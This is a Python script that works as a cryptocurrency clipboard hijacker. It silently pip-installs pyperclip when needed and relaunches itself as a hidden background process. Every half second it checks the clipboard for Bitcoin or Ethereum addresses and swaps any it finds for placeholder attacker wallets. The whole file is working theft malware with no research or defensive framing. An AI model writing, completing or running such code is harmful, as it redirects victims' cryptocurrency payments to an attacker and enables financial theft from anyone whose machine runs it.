import os, sys, re, time, subprocess, logging

logging.basicConfig(filename="handler.log", level=logging.INFO, format='%(asctime)s %(message)s')
class Handler:
    def __init__(self):
        self.btc_pattern = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[0-9a-zA-HJ-NP-Z]{11,71}$'
        self.eth_pattern = r'^0x[a-fA-F0-9]{40}$'
        self.addrs = ["EthereriumWalletHere", "BitCoinWalletHere"]
        try:
            global pyperclip
            import pyperclip
        except ModuleNotFoundError:
            try:
                os.system("pip install pyperclip")
                os.execl(sys.executable, sys.executable, *sys.argv)
            except Exception as e:
                logging.error(f"Failed to install or execute pyperclip: {e}")
                sys.exit(1)

    def read(self):
        """Reads the clipboard and checks if 'btc', 'eth', or invalid based on the address style"""
        try:
            address = pyperclip.paste()
            if re.match(self.btc_pattern, address):
                return "btc"
            elif re.match(self.eth_pattern, address):
                return "eth"
            return "nil"
        except Exception as e:
            logging.error(f"Failed to read clipboard: {e}")
            return "nil"

    def write(self):
        """Writes address to the clipboard based on the address type read """
        address_type = self.read().strip()
        try:
            if address_type == "eth":
                pyperclip.copy(self.addrs[0])
            elif address_type == "btc":
                pyperclip.copy(self.addrs[1])
        except Exception as e:
            logging.error(f"Failed to write to clipboard: {e}")

def run():
    if len(sys.argv) == 1:
        try:
            if os.name == "posix":
                subprocess.Popen([sys.executable] + [sys.argv[0], 'bg'] + sys.argv[1:],
                                 close_fds=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            elif os.name == "nt":
                subprocess.Popen([sys.executable] + [sys.argv[0], 'bg'] + sys.argv[1:],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

        except Exception as e:
            logging.error(f"Failed to run in background: {e}")
        sys.exit(0)

if __name__ == "__main__":
    run()
    while True:
        handler = Handler()
        handler.write()
        time.sleep(0.5)
